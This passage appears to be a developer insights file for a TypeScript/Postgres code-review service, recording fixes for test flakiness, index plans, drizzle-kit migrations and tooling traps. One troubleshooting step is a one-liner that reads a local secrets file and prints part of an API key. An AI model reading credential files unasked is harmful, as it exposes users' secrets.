**Symptom.** `pnpm exec vitest run .it.test` failed 2 of 199 on 2026-08-23 — first in
`reviews-context.it.test.ts`, then, on a re-run that EXCLUDED the file just added, in
`reviews-skills.it.test.ts`. Both pass in isolation. The failure is always a `GET /runs/:id` that
answers 404 because the run had not finished.
**Cause.** Every `*.it.test.ts` starts its own Testcontainers Postgres, so the parallel run boots
23 containers at once and the machine starves them. It is a load artefact, not a defect in the
suite that happens to lose.
**Fix.** `pnpm exec vitest run .it.test --no-file-parallelism` — 23 files, 199 tests, 90 s wall,
all green. Use it before concluding that a change broke an integration test, and re-run any single
failing file alone first; the file that fails moves between runs, which is the tell.

## Tool & Library Notes

### A full index on `(workspace_id, agent_id, ran_at)` does not serve a query that filters `status`

Postgres will not use a b-tree whose leading columns match if the extra predicate throws away
most of what it reads — it costs the scan out and picks a sequential scan instead. Measured
2026-08-27 on 20 000 `agent_runs`, 1 000 of them `done`, against
`lastSuccessfulRunPerAgent` (`repository/run.repo.ts`):

| index | plan | buffers |
|---|---|---|
| `(workspace_id, agent_id, ran_at desc)` | Seq Scan, `Rows Removed by Filter: 19000` | 267 |
| the same, `WHERE status = 'done'` | Bitmap Heap Scan on the index | 66 |

The partial index is `agent_runs_ws_agent_done_ran_idx` (migration `0023`). **Its predicate and
the query's `where` are one thing in two files**: widen the query to a second status, or drop the
filter, and the index stops being usable — silently, with every test still green. Drizzle
expresses it as ``index(name).on(cols).where(sql`…`)`` and `drizzle-kit generate` emits the
`DROP INDEX` + `CREATE INDEX … WHERE` pair on its own; renaming the index is what makes it do so
rather than silently skipping the change.

**Correction, 2026-08-27 (same day, next round).** The comment this entry's index carries in
`db/schema/runs.ts` claims the read is "one index step per agent". It is not, and the reason is
below: `.desc()` emits `NULLS LAST`, `ORDER BY ran_at DESC` means `NULLS FIRST`, so the index
cannot supply the `DISTINCT ON` pathkeys and a `Sort` of every `done` row sits on top of it even
when the index scan is forced. Measured on 20 000 runs / 19 082 `done`: forced through
`agent_runs_ws_agent_done_ran_idx`, `Unique → Sort (19 082 rows) → Bitmap Heap Scan`; through an
otherwise identical `NULLS FIRST` twin, `Unique → Index Scan`, no sort. The buffer figures in the
table above are real and unaffected — the index still stops the sequential scan. Only the "one
index step" claim is wrong. Left unfixed on purpose: that round's index was not in scope for this
one.

### Drizzle's `.desc()` on an index column emits `NULLS LAST`, and `ORDER BY x DESC` wants `NULLS FIRST`

**Symptom.** An index whose columns match a query's `WHERE` prefix and its `ORDER BY` exactly is
used for the scan — and Postgres still puts a `Sort` node on top of it. Seen 2026-08-27 while
adding `agent_runs_ws_pr_ran_idx` (migration `0024`) for the PR page's run-history poll.

**Cause.** `t.ranAt.desc()` generates `"ran_at" DESC NULLS LAST`; SQL's `ORDER BY ran_at DESC`
means `DESC NULLS FIRST`. Postgres matches sort pathkeys **structurally**, and a `NOT NULL`
constraint on the column does not make the two equivalent — the planner never consults it here.

**Fix.** Write `t.ranAt.desc().nullsFirst()` whenever the index exists to serve an
`ORDER BY … DESC`. Measured on 20 000 `agent_runs`, 100 of them on the target PR:

| index tail | plan | buffers |
|---|---|---|
| none | `Sort → Seq Scan`, `Rows Removed by Filter: 19 900` | 387 |
| `ran_at DESC NULLS LAST` | `Sort → Index Scan` | 104 |
| `ran_at DESC NULLS FIRST` | `Index Scan`, no sort | 104 |

The buffer count is the same either way at this size; what the mismatch costs is a sort whose
input grows with one PR's history, and it is invisible to every gate. `EXPLAIN` is the only thing
that tells you — check for a `Sort` node above your own index, not just that the index appears.

### `execSync` deadlocks a Fastify server you booted in the same process

**Symptom.** A throwaway script that starts `buildApp` + `app.listen()` and then curls
itself through `execSync('curl …')` hangs forever — no response, no error, a 300 s
timeout (2026-08-26, while smoke-testing the multi-agent routes).

**Cause.** `execSync` blocks the Node event loop until the child exits, and the server
that has to answer the request is on that same loop. `curl` waits for a reply that cannot
be produced until `curl` exits.

**Fix.** Put the server in its own process. Boot it with `nohup pnpm exec tsx <script>.ts &`,
have the script print a readiness line and stay up on a `SIGTERM` handler, then curl from
the shell. `app.inject()` is the in-process alternative and is a real request through the
whole Fastify lifecycle — but it is not a socket, so it proves nothing about the listener.

### `break` out of a `for await` destroys the stream, so teardown errors land inside the `try`

**Symptom.** `readCapped` in `adapters/skill-fetch/index.ts` refuses an oversized document.
A review argued the refusal could be masked by a throwing `res.destroy()`, since the
destroy sat inside a `try` whose `catch` rewrites anything that is not a `ValidationError`.
Moving the throw out of the block did NOT fix it — the test written for the finding failed
against the restructured code.

**Cause.** Leaving a `for await (const chunk of stream)` with `break` calls the async
iterator's `return()`, which destroys the stream. Measured 2026-08-03: after `break`,
`stream.destroyed === true` and the producer stopped after 3 of 50 chunks. So the teardown
happens *inside* the loop body's block no matter where the `throw` is written.

**Fix.** Decide first, tear down second, and let the decision outrank the teardown:

```ts
if (bytes > MAX) { overflowed = true; break; }
} catch (err) {
  if (!overflowed) throw new ExternalServiceError(...);  // only a failure BEFORE the refusal
}
if (overflowed) throw new ValidationError(...);
```

Worth knowing separately: `Readable.destroy()` does not throw synchronously — it returns
the stream, and destroying twice is silent — so the reported path was never reachable. The
shape still invited it, and the test caught a real defect in the first fix.

### `fflate.unzipSync` copies the COMPRESSED size for a stored entry, not the one its filter reports

**Symptom.** `parseSkillArchive` enforces `MAX_ENTRY_BYTES` and `MAX_TOTAL_BYTES` in the
`unzipSync` filter and still allocates hundreds of megabytes from a 2 MB upload.

**Cause.** `UnzipFileInfo` carries `originalSize` (uncompressed) and `size` (compressed) as two
independent numbers read from the central directory — the archive writes whatever it likes in
each. For a STORED entry (`compression === 0`) fflate copies `size` verbatim
(`slc(data, b, b + sc)`, `esm/index.mjs:2702` in 0.8.3). Budgeting `originalSize` alone let 200
entries declaring a kilobyte each point at the same ~2 MB payload.

**Fix.** Budget `Math.max(entry.originalSize, entry.size)` — `server/src/modules/skills/import.ts:42`.
The pre-inflation filter is still the right mechanism and the deflate path was never affected:
fflate does not grow a supplied `out` buffer, so a declared-4 GB deflate member really does
refuse to allocate.

### `drizzle-kit generate` emits DDL only — a data backfill has to be hand-appended

**Symptom.** You re-add a dropped column and expect existing rows to be repopulated.
`pnpm db:generate` writes a one-line `ALTER TABLE … ADD COLUMN` and nothing else.

**Cause.** drizzle-kit diffs the schema snapshot; it has no notion of data intent.

**Fix.** Edit the generated file and append the `UPDATE` after a `--> statement-breakpoint`
marker — the migration runner splits on it, so a missing marker silently merges two
statements. `server/src/db/migrations/0010_concerned_dragon_lord.sql` is the worked
example (backfilling `agent_runs.cost_usd` from an inlined price snapshot).

Two things worth copying from it: values that came from a TypeScript table
(`src/adapters/llm/pricing.ts`) must be inlined as a `VALUES` list and then **frozen** — a
historical cost is a record, not a live computation, so it must not be re-synced when the
TS table changes. And the hand-written SQL gets executed for real by the integration
suite: `test/helpers/pg.ts` calls `runMigrations` against a testcontainers Postgres, so
`pnpm exec vitest run .it.test` is the cheapest way to prove a backfill statement parses
and runs. A broken one fails all six `.it.test.ts` files, not zero.

### `../TESTING.md` says `package.json` is `skip-worktree`, but it is not

**Symptom.** You read that `server/package.json` is held under `skip-worktree`, check
your clone, and find no such flag.

**Cause.** `skip-worktree` is a **local, per-clone git flag**. It is not committed and
does not survive cloning. The note documents a convention someone applies on their own
machine, not a property of the repository.

**Fix.** Do not rely on committed `test:unit` / `test:integration` scripts existing —
CI invokes `pnpm exec vitest run …` directly for this reason. If you want the flag, set
it yourself: `git update-index --skip-worktree server/package.json`.

### dependency-cruiser has three ways to check nothing and still print a green tick

**Symptom.** `.dependency-cruiser.cjs` reports `✔ no dependency violations found` for rules
that should obviously be failing, or floods you with violations that are plainly legal.

**Cause.** Three independent traps, all hit while writing the arch gate on 2026-08-01:

1. **`exclude` deletes the module *and every edge pointing at it*; `doNotFollow` keeps the
   edge.** A config with `exclude: { path: 'node_modules|…' }` removed every npm package from
   the graph, so all four rules whose `to` names a package — `no-sql-outside-repository`,
   `no-fastify-outside-http`, `core-stays-pure`, `not-to-dev-dep` — matched nothing and
   reported clean. Use `doNotFollow: { path: 'node_modules' }`. The tell is the module count:
   123 with `exclude`, 149 with `doNotFollow`.
2. **Capture-group backreferences are `$1`, not a regex `\1`.** The slice-isolation rule
   `to: { path: '^src/modules/([^/]+)/', pathNot: '^src/modules/(\\1|_shared)/' }` flagged 35
   *same-module* imports. `$1` reduces it to the one genuine cross-slice import.
3. **The resolver strips the `node:` prefix.** `import 'node:fs/promises'` lands in the graph
   as `fs/promises`, so a rule matching `^node:fs` matches nothing. Write `^(node:)?fs(/|$)`.

Also load-bearing: `options.tsConfig.fileName` resolves the `@devdigest/*` path aliases.
Without it `reviewer-core` never enters the graph at all and `core-stays-pure` is decoration.

**Fix.** Before trusting a new rule, point its `to` at something you know exists inside that
`from` scope and confirm it reports; then revert the probe. `pnpm arch:strict` shows the full
picture, and the module count in the footer is the fastest sanity check that the graph is the
size you expect.

### Anthropic's structured-output API rejects a Zod schema that states a bound

**Symptom.** A `completeStructured` call that works on OpenAI fails on any Anthropic model
through OpenRouter with `400 Provider returned error`, whose raw body reads
`output_config.format.schema: For 'array' type, property 'maxItems' is not supported` — or
`For 'number' type, properties maximum, minimum are not supported`.

**Cause.** `toJsonSchema` renders `z.array(...).max(24)` as `maxItems` and
`z.number().min(0).max(1)` as `minimum`/`maximum`. Anthropic's schema subset accepts neither.
The bound is usually only a preference, so nothing warns you that stating it costs a provider.

**Fix.** Keep bounds out of the schema the model sees; state them in the prompt and enforce
them in the service — `ConventionsService.ground` slices to `MAX_CANDIDATES` and clamps the
confidence (`server/src/modules/conventions/prompt.ts:20`). A test that pins its provider is
what makes this reproducible: `conventions-service.test.ts` injects the mock under `openai`,
`anthropic` and `openrouter` because the registry default decides which one the service asks
for, and when that default moved the suite silently started calling a real API.

### `drizzle-kit generate` cannot be answered from a pipe

**Symptom.** `pnpm db:generate` prints `Is <column> in <table> created or renamed from another
column?` and then hangs forever. `printf '\n' |` does not help; neither does a pty via `script`.

**Cause.** The prompt appears whenever one generate step both adds and drops columns — it
cannot tell a rename from a create/drop pair — and it reads raw TTY keypresses, not stdin.

**Fix.** Split the change into two runs with an unambiguous shape each: add the new columns
first (additions only, no prompt), then delete the old one (a drop only, no prompt).
Migrations `0012` and `0013` are that pair.


### Seeding a blast fixture needs three rows per caller file, not one

`getResolvedCallers` (`modules/repo-intel/repository.ts`) INNER JOINs `file_rank` on
`(repo_id, from_path)`, so a `references` row whose caller file has no `file_rank` row is dropped
silently and the request answers "no callers" — indistinguishable from a correct empty answer. A
fixture caller file therefore needs three rows: `references` for the call site, `file_rank` or the
join eats it, and `symbols` or `enclosingFromRows` labels the caller with the file's basename
instead of its enclosing function. `seedIndexedRepo` in `test/blast.it.test.ts` is the worked
example.

### `MockGitClient` copies `opts.tree`, because `writeFile` mutates it

**Symptom.** `test/context.it.test.ts` builds a second app to simulate a resync putting a branch's
text back on disk. The assertion that the document is now `stale` failed: the "reset" clone already
held the edit.
**Cause.** Both apps were constructed from the same module-level `TREE` constant, and
`MockGitClient.writeFile` wrote into the object it was handed. Two clients over one fixture were one
clone with two names — and every later case in the file silently depended on which earlier one had
written.
**Fix.** The constructor now does `this.tree = { ...(opts.tree ?? {}) }` and every method reads
`this.tree` (`adapters/mocks.ts`). A mock that mutates a shared fixture is a test-ordering bug
waiting for the first test that writes.

### `drizzle-kit generate` emits a composite-PK migration that cannot run, and asks you for the old key's name

**Symptom.** Switching `pr_brief` from `pr_id` to a `(pr_id, head_sha)` composite key produced
`0018_blue_ultimates.sql` with `ADD CONSTRAINT ... PRIMARY KEY("pr_id","head_sha")` **before**
`ADD COLUMN "head_sha"`, plus a commented-out `DROP CONSTRAINT "<constraint_name>"` and a note
saying "we can't automatically get name for primary key".
**Cause.** drizzle-kit 0.30 orders constraint statements ahead of column statements and has no way
to read the implicit name Postgres gave an inline `PRIMARY KEY`.
**Fix.** Both halves are hand edits, and the tool asks for one of them. The old name is
`<table>_pkey` — confirm it rather than assume:
`SELECT constraint_name FROM information_schema.table_constraints WHERE table_name='pr_brief' AND
constraint_type='PRIMARY KEY'`. Then reorder to drop the old key, add every column, add the
composite key. This is on top of the two-run rule in `AGENTS.md`: run 1 added the columns and
switched the key, run 2 (`0019`) dropped `json`.

### A dev server on `tsx watch` picks up an in-progress branch, so a live `curl` may already be your code

`./scripts/dev.sh` runs the API under `tsx watch`. During plan 10 a `pr_brief` row appeared with
`detail` strings in the exact format of helpers written minutes earlier — the watcher had reloaded
and the client had computed a brief through the new module. Useful (the real entry point exercises
itself), but it also means a "pre-existing" row may be yours: check `computed_at` against the
session, remembering the column is UTC and the shell is not.

### The unrunnable `pr_brief` migration was a constraint change, not a `pr_brief` change (2026-08-16)

Complement to the composite-PK entry above, so the next agent does not hand-edit a file that needs
no editing. Adding `pr_brief.ref_lines` (jsonb, `NOT NULL DEFAULT '[]'`) and `reviews.head_sha`
(text, nullable) in one run emitted `0020_broad_steel_serpent.sql` as exactly two `ADD COLUMN`
statements — no constraint statement, no `<constraint_name>` placeholder, no reordering needed, and
no TTY prompt, because the run dropped no column for a new one to be a rename of. The 0018 hazard
belongs to `PRIMARY KEY` / constraint edits, which drizzle-kit 0.30 emits before the columns they
depend on; an add-only run does not reach that path.

**Reading the SQL is still how you know**, and it is two commands:
`grep -cE 'ADD COLUMN' <file>` against `grep -nE 'CONSTRAINT|PRIMARY KEY|DROP' <file>` — the second
printing nothing is the all-clear. Prove the `DEFAULT` reached existing rows against the database
rather than the file: `SELECT count(*) FILTER (WHERE ref_lines = '[]'::jsonb) FROM pr_brief` returned
2 of 2, which is what makes "old rows read as `[]`, no data migration" a measurement instead of a
claim.
### `TiktokenTokenizer` answers `chars/4` after one failure, for the rest of the process

`count()` (`src/adapters/tokenizer/index.ts:31-41`) lazily loads the `cl100k_base` BPE ranks. If
that throws **once** it sets `broken = true`, and every later call returns
`approxTokens` — `Math.ceil(text.length / 4)` — for the lifetime of the process. There is no log
line, no flag on the return value, and no way for a caller to tell a real count from the
heuristic. The fallback is deliberate and right for the renderer it was written for, which must
never throw mid-render.

It is not right for a caller that has to **guarantee** a bound. A requirement of the form "the
model input must not exceed N tokens" is enforced exactly as strongly as the encoder that happened
to load: a budget walk passes, the log says 7 900, and the real input is whatever `chars/4`
mis-estimated. Any feature that must hold such a bound needs a tokenizer that can *report*
degradation, not one that absorbs it — decide that before writing the acceptance criterion, not
after.

The file's header comment says "in-process, and two callers". There are at least seven:
`modules/context/scan-executor.ts:86`, `modules/context/service.ts:463,629`,
`modules/conventions/service.ts:234`, `modules/skills/service.ts:89`,
`modules/reviews/run-executor.ts:707`, plus the repo-map budget search it was written for. Counted
2026-08-16; treat the comment's scope claim as stale rather than as a boundary.

### `startPg()` from a scratch script exercises DB code for real without an `*.it.test.ts`

To prove a write actually lands in Postgres when the plan does not authorise a new integration
file, call `test/helpers/pg.ts:startPg()` from a scratch script: it starts an isolated
`pgvector/pg16` container, runs the migrations and hands back a Drizzle handle, so the dev
database on 5434 is never written to. Used 2026-08-17 to confirm that P1.9's failure stamp is
accepted by the real `repo_index_state` (`status` is plain `text`, no enum or check constraint)
and reads back through `tryGetIndexState` as `degraded: true, degradedReason: 'index_failed'`
with the previous sha intact.

Two mechanics cost a turn each, on top of the CWD rule already recorded under *What Works*:

- The file must be **`.mts`**. A `.ts` file in a directory with no `"type": "module"` is compiled
  by tsx as CJS, and every top-level `await` fails with *"Top-level await is currently not
  supported with the cjs output format"*.
- The script may import **server files only**. `import { eq } from 'drizzle-orm'` resolves from
  the script's own directory, not from the CWD, so it dies with `ERR_MODULE_NOT_FOUND` even
  though `pnpm exec tsx` was run from `server/`. Reach the data through a repository method
  instead of writing a query in the script.

### `new SimpleGitClient('./clones')` from `server/` drives a clone-reading executor for real

The git twin of the `startPg()` entry above, and the same two mechanics apply (`.mts`, server
imports only). `server/clones/` already holds this repository cloned as `Holubinka/dev-digest`, so
an executor that only reads a clone can be run against a real one with no API, no DB and no route:
construct `new SimpleGitClient('./clones')`, stub the facade, pass
`{ id, owner: 'Holubinka', name: 'dev-digest', fullName }`. Used 2026-08-17 to exercise
`OnboardingGatherExecutor` end to end — five manifests, `pnpm` for `client`/`server` and `npm` for
`e2e`/`mcp`/`reviewer-core`, `docker-compose.yml` read whole, both `.env.example` files found.

Two things that run is **not** evidence of, both checked rather than assumed:

- **The exclusion list.** That clone has no `node_modules/` and no `client/.next/`, so nothing was
  there to exclude. `EXCLUDED_WALK_DIRS` is still only provable over a temp clone built to contain
  them.
- **A root package block.** DevDigest declares no workspace and has no root `package.json`, so a
  scan of it finds **five** packages and never exercises the root-first rule (AC-94). A plan or a
  verification step expecting six on this repository is counting a package that does not exist.

### npm's bare script form works for exactly four scripts; pnpm, yarn and bun take any

**Symptom.** A generated `npm dev` beside a copy control errors on paste, while the identical
`pnpm dev` works and the equally bare `npm test` works too. All three passed the same
"manager plus script name" check.

**Cause.** npm has no GENERAL bare form — `npm run <script>` is it — but `test`, `start`, `stop`
and `restart` are built-in npm commands that run the like-named script. Measured on npm 10.9.8,
2026-08-18, against one manifest declaring all six scripts:

```
npm test → RAN_TEST   npm stop    → RAN_STOP      npm dev   → Unknown command: "dev"
npm start → RAN_START  npm restart → RAN_RESTART   npm build → Unknown command: "build"
```

That mixture is the trap. Try the bare form on `test` and npm looks like pnpm; try it on `dev`
and it does not. pnpm, yarn and bun accept the bare form for every script.

**Fix.** Where code emits a script command per package manager, gate the bare form for npm on
the four-name set and require `run` for everything else — `NPM_BARE_COMMANDS` and `runsScript` in
`modules/onboarding/helpers.ts`. Both over- and under-strict versions cost something real, which
is why neither end is the safe default: requiring `run` always drops `npm test`, one of the first
commands a newcomer types and one that is not broken; requiring it never emits `npm dev`, which
errors on paste. Do not extend the set from memory — re-measure, as the numbers above were.

### A literal `.default([])` does not leak between parses — but only because `ZodArray` rebuilds

Zod 3 wraps a non-function default as `() => value`, so every parse of a missing key is handed
THE SAME object. Whether that object reaches the caller depends on the schema underneath it, and
the answer is not uniform. Measured on zod 3.25.76 (2026-08-18, `node --input-type=module`):

```
z.array(z.string()).default([])   → parse({}).a === parse({}).a   false
z.object({ n: z.number() }).default({ n: 0 })                     false
z.unknown().default([])           → parse({}).raw === parse({}).raw  true
```

`ZodArray._parse` and `ZodObject._parse` construct a new container from the parsed members, so
the default is data going in and never the value coming out; `z.unknown()` passes its input
through untouched, and every parse then shares one array that any caller can `push` into.

So the literal form used across `vendor/shared` — `contracts/trace.ts:168`,
`contracts/eval-ci.ts:97`, and every count and array in the onboarding block of
`contracts/knowledge.ts` — is safe and needs no `() => []` factory. Reach for the factory when
the schema does not rebuild: `z.unknown()`, `z.any()`, `z.custom()`, or anything ending in a
`.transform()` that returns its argument. Re-measure rather than reasoning it out; the three
results above are one line each.

### A scratch script that exercises server code against a real clone must be `.mts`, not `.ts`

`pnpm exec tsx /tmp/…/exercise.ts` fails with `Top-level await is currently not supported with the
"cjs" output format`, even though `server/package.json` declares `"type": "module"`. The manifest
that decides the format is the nearest one to the SCRIPT, not to the cwd — and a file in a
scratchpad directory outside the repository has none, so esbuild defaults to CJS. Renaming to
`.mts` fixes it outright; `tsx` still picks up `server/tsconfig.json` from the cwd, so the
`@devdigest/shared` path alias keeps resolving and imports written as `…/helpers.js` still land on
the `.ts` source. Measured 2026-08-18, tsx bundled with `server/`, Node 22.23.1.

Worth knowing because this is the cheapest way to exercise a pure module against
`server/clones/<owner>/<repo>` through the real port — no Postgres, no model call, no test file
added to the suite for something that is a one-off check.



### `pnpm typecheck` does not read `server/test/`, so a test's type errors are invisible to every gate

**Symptom.** `test/repo-intel-critical-paths.test.ts` declared `make: (i: number) => string` and
called it with `String(i).padStart(2, '0')`. Nine tests were green, `pnpm typecheck` was clean, and
the branch passed every gate.
**Cause.** `server/tsconfig.json` does not include `test/`, and vitest does not typecheck. Nothing
in Track A reads that file as TypeScript.
**Fix.** Until the tsconfig covers `test/`, an editor diagnostic is the only thing that sees it.
This cuts against the (correct) local rule that editor diagnostics lie here — they do not resolve
tsconfig `paths` and routinely invent `Cannot find module '@devdigest/shared'` where
`pnpm typecheck` is clean. Both are true at once: **distrust a diagnostic that names a module
resolution problem; read one that names a type mismatch inside a test file**, because no gate will
tell you.


## Recurring Errors & Fixes

### A widened `ReviewRepository` breaks hermetic tests at RUNTIME, and the error names the wrong thing

**Symptom.** Adding one method to `ReviewRepository` and calling it from
`run-executor.ts` turned three green hermetic tests red on 2026-08-26 with
`expected [] to have a length of 1` and `expected false to be true` —
`test/reviews-repo-intel-once.test.ts` (2 cases) and `test/review-head-sha.test.ts`
(1 case). `pnpm typecheck` stayed clean throughout, and nothing in the output
mentioned a missing method.

**Cause.** Those tests build their repository as
`{ insertReview: …, completeAgentRun: … } as unknown as ReviewRepository`. The double
cast is what lets a five-method object stand in for a fifty-method class, and it is also
what stops the compiler noticing the fifty-first. At runtime the executor calls
`this.repo.startAgentRun(runId)`, the stub has no such key, the `TypeError` lands in
`runJob`'s own `catch` — which exists to isolate ONE agent's failure — and the run is
recorded as a failed agent instead of a crash. Every assertion downstream then fails for
its own apparent reason.

**Fix.** After adding a method to `ReviewRepository` that the executor calls, grep for the
stubs and extend each one:

```sh
grep -rln "as unknown as ReviewRepository" server/test server/src
```

Three files carried it on 2026-08-26. `pnpm exec vitest run --exclude '**/*.it.test.ts'`
is the only gate that sees this; typecheck cannot.

### A `.it.test` failure that reproduces only in the full lane is the 10 s in `waitForPrRuns`

**Symptom.** `cd server && pnpm exec vitest run .it.test` fails 1–3 cases out of 196,
a different set each run, always in `reviews-context.it.test.ts`, `reviews-skills.it.test.ts`
or `reviews.it.test.ts`. The assertions look like real defects — `expected 404 to be 200`
on `GET /runs/:id/trace`, or `Cannot read properties of undefined (reading 'model')`.
Running the same files alone passes 3/3 (measured 2026-08-26).

**Cause.** `test/helpers/runs.ts` gives up after `timeoutMs = 10_000` and **returns the
runs anyway** rather than throwing. Under the full lane this machine has 23 testcontainer
Postgres instances competing, a run takes longer than 10 s, and the caller proceeds with a
run that is still `running` — whose trace has not been written yet, hence the 404. The
helper's silence is the whole illusion: the test reads as "the trace endpoint is broken"
rather than "we did not wait long enough".

**Fix.** Before believing a `.it.test` failure, run that file alone:

```sh
cd server && pnpm exec vitest run test/<the-file>.it.test.ts
```

Green alone and red in the lane means the timeout, not the code. Verified 2026-08-26 that
the same failures occur with `--exclude '**/multi-agent.it.test.ts'`, i.e. independently
of whichever file was added last.
### A hand-rolled "find the closing `` `; `` " prompt-sync script corrupts a constant that quotes its OWN template-literal syntax in prose

**Symptom (2026-08-24).** Editing `security-reviewer.md` to add a worked example, then re-syncing
`server/src/db/seed-prompts.ts` with a one-off Python script (`ts.index('`;', content_start)` to
find where the OLD `SECURITY_REVIEWER_PROMPT` content ended), corrupted the file: `tsx watch` died
immediately with `Unexpected "return"` and the dev server would not start.

**Cause.** `security-reviewer.md`'s own Example 1 quotes a JS template literal in prose —
`` `quote: "const query = \`SELECT * FROM users WHERE id = ${id}\`;"` `` — which, once escaped for
embedding (`\\` → `\\\\`, `` ` `` → `` \` ``, `${` → `\${`), contains the literal two-character
substring `` `; `` WAY BEFORE the true end of the constant. A naive `indexOf('`;', ...)` search
stops there, not at the real closing delimiter — splicing the new content in, followed by whatever
was left of the OLD content from that false match onward, both inside the same broken template
literal. This same repo already has the CORRECT parser for this — `scripts/prompt-sync.mjs`'s
`seedLiteral()` scans character-by-character and checks `\\` before `` \` `` / `\$` for exactly this
reason (see the 2026-08-23 entry in `reviewer-core/INSIGHTS.md` about the same class of bug in an
earlier, read-only version of that scanner) — but it is a COMPARISON tool, called by nothing that
WRITES the seed file. Every prompt sync this session before this one happened not to trip it only
because no other prompt's own text happened to quote an escaped-backtick-plus-semicolon sequence.

**Fix.** Do not search prompt content for a delimiter. Find the boundary STRUCTURALLY instead: the
seed file declares five constants back to back (`grep -n "^export const" server/src/db/seed-prompts.ts`),
so the true end of one is bounded by the START of the next (or EOF for the last). Locate
`` export const NEXT_CONSTANT = ` `` and take the LAST `` `; `` before it, not the first anywhere in
the file — verified working, then re-verified with `node scripts/prompt-sync.mjs` (checks content),
`pnpm typecheck` (checks the file parses as valid TS, which prompt-sync alone does NOT catch — it
compares strings, not syntax), and a visual diff of the untouched neighboring constants. **A
generalizable fix**, not yet done: give `seedLiteral()`'s scanner a WRITE-side twin (a small
"replace this constant's literal, structurally" helper) so nobody hand-rolls this search again.

### A review run fails with `401 Missing Authentication header`

**Symptom.** Every run lands in the timeline as `error` with
`401 Missing Authentication header`. It reads like the server forgot to send the header.

**Cause.** It usually means the configured OpenRouter key is the wrong *shape*, not
missing. `SecretsProvider` reads `~/.devdigest/secrets.json` and passes whatever it finds
through; OpenRouter rejects a malformed bearer token with this message. Seen on
2026-07-28 with a 64-char hex `OPENROUTER_API_KEY` — a real one starts `sk-or-v1-`.

**Fix.** Check the prefix, not just the presence:
`python3 -c "import json,os;print(json.load(open(os.path.expanduser('~/.devdigest/secrets.json')))['OPENROUTER_API_KEY'][:9])"`.
Note the failed run still persists correctly (`status='failed'`, `cost_usd` NULL), so this
is a usable way to exercise the "no data" UI branch on purpose.

### API exits immediately with `ERR_MODULE_NOT_FOUND`

**Symptom.** `pnpm dev` dies at start-up complaining about a module it cannot resolve,
even though `server/node_modules` is fully installed.

**Cause.** The server imports `@devdigest/reviewer-core` as **raw TypeScript source**
from the sibling directory, so `reviewer-core`'s own dependencies must be installed on
disk. There is no build step that would have bundled them.

**Fix.** `cd ../reviewer-core && npm install` (npm, not pnpm, in that package).
`scripts/dev.sh` does this for you; a manual `pnpm dev` does not.

### `LOG_LEVEL` rejected as an invalid enum value

**Symptom.** Boot fails with a Zod error on `LOG_LEVEL` right after copying
`.env.example` to `.env`.

**Cause.** `.env.example` ships `LOG_LEVEL=` with no value. An empty string is not a
member of the level enum, and `.default()` does not apply because the key is present.

**Fix.** Already handled — `platform/config.ts` wraps the field in `z.preprocess` that
maps `''` to `undefined`. If you add another optional enum-typed env var, do the same or
it will fail the same way.

### Tests fail on an import that `typecheck` accepts

**Symptom.** `pnpm typecheck` is clean, `pnpm test` cannot resolve `@devdigest/…`.

**Cause.** Vite and Vitest do not read tsconfig `paths`. `vitest.config.ts` carries a
duplicate `resolve.alias` block, and the two drifted.

**Fix.** Change both files together.

### Correction (2026-07-27) — `typecheck` never reads `test/`

**Symptom.** As above, but "change both files together" neither explains the silence nor
reliably confirms the fix.

**Cause.** Alias drift is only half of it. `tsconfig.json:28` sets
`"include": ["src/**/*.ts"]` and `typecheck` runs `tsc --noEmit -p tsconfig.json`
(`package.json:10`), so `test/` sits outside the compilation entirely — measured with
`pnpm exec tsc -p tsconfig.json --noEmit --listFiles`, tsc reads 107 files from `src/` and
**zero** from `test/`. The nine `@devdigest/…` imports under `test/` are invisible to
`typecheck` no matter how well the two alias lists agree.

**Fix.** When an `@devdigest/…` import resolves under tsc but not under vitest, go straight
to `resolve.alias` in `vitest.config.ts:6-9` — that list, not tsconfig `paths`, is what
vitest resolves with. Do not expect `pnpm typecheck` to confirm the fix when the import
lives in `test/`; re-run vitest.

Do not "sync" the two lists on sight. `tsconfig.json:21-26` carries four mappings including
`/*` wildcards against two bare aliases in `vitest.config.ts:6-9`, and nothing imports a
subpath today — every `@devdigest/…` specifier in `src/` and `test/` is bare. That
asymmetry is inert, not a bug.

### Correction (2026-08-18) — the same gap bites FIXTURE VALUES, not just imports

**Symptom.** `pnpm typecheck` clean, `pnpm arch` clean, 1130 unit tests green — and
`test/onboarding.it.test.ts` failed three cases inside a testcontainers run with `tour: null`
where a saved tour was expected. Nothing in the source was wrong.

**Cause.** The fixture said `kind: 'what_it_does'`, which is not a member of
`OnboardingSectionKind` (`contracts/knowledge.ts` has `architecture | critical_paths |
how_to_run | reading_path | first_tasks`). The record was written to jsonb unvalidated and then
failed `OnboardingRecord.safeParse` on the way back out, which the repository correctly degrades
to "no tour yet". The 2026-07-27 correction above explains why `tsc` said nothing — `test/` is
outside the compilation — but it frames the consequence as unresolved IMPORTS. The larger cost is
that **every type annotation in every test file is decorative**: a `const DRAFT: OnboardingDraft`
whose literal violates the type is accepted, and the failure surfaces minutes later behind Docker.

**Fix.** Typecheck the tests explicitly before running a new `*.it.test.ts`, with a throwaway
config so nothing is added to the repo:

```sh
cd server && cat > tsconfig.tests.tmp.json <<'JSON'
{ "extends": "./tsconfig.json",
  "compilerOptions": { "noEmit": true },
  "include": ["src/**/*.ts", "test/**/*.ts"] }
JSON
npx tsc --noEmit -p tsconfig.tests.tmp.json; rm -f tsconfig.tests.tmp.json
```

Run on 2026-08-18 it found two more defects the suite would have hit at runtime — a
`noUncheckedIndexedAccess` destructure of a `count(*)` row, and `req.headers` on the `{}`-typed
request of a hand-rolled `AuthProvider` (the same line exists unfixed in
`test/brief-rate-limit.it.test.ts`). It also reports pre-existing errors in other test files, so
grep the output for the files you touched.

### An integration test that starts a review makes LIVE OpenRouter calls unless `secrets` is overridden

**Symptom.** `pnpm exec vitest run .it.test` failed 2 of 4 consecutive runs on 2026-08-05 —
2 or 3 cases in `test/reviews-skills.it.test.ts`, always `expect(res.statusCode).toBe(200)`
receiving `404` from `GET /runs/:id/trace`. The same file passed 3/3 when run alone. Nothing in
that file had been edited.

**Cause.** Not flakiness in the ordinary sense. The 05 intent pre-pass runs inside every review,
`review_intent` defaults to provider `openrouter`, and `overrides.llm` in that file supplied
`openai` only. `container.llm('openrouter')` therefore built a **real** `OpenRouterProvider`
whose key came from `~/.devdigest/secrets.json` — which `LocalSecretsProvider` reads regardless
of `NODE_ENV`. Proved by probe, not inferred: the persisted trace carried
`Deriving PR intent done (2973ms)` and
`Intent unavailable — OpenRouter structured output failed schema validation for Intent`, and
